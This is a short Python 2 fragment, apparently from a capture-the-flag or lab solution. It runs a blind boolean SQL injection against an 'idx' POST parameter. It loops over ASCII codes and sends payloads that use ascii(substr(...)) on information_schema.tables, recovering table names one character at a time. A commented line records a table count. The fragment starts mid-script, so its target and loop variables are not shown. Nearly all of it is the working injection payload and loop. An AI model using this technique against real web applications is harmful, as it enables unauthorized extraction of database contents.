...
while True:
    for j in range(33, 123):
        #data={'idx':"37869 and if ((select count(table_name) from information_schema.tables)=72,1,0)"} n(table)=72
        data = {'idx': "37869 and if(ascii(substr((select table_name from information_schema.tables order by table_type limit "+str(limit)+",1)," + str(i) + ",1))=" + str(j) + ",1,0)"}
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        status_code = response.status_code
        html_data = response.text
        print "37869 and if(ascii(substr((select table_name from information_schema.tables order by table_type limit "+str(limit)+",1)," + str(i) + ",1))=" + str(j) + ",1,0)"
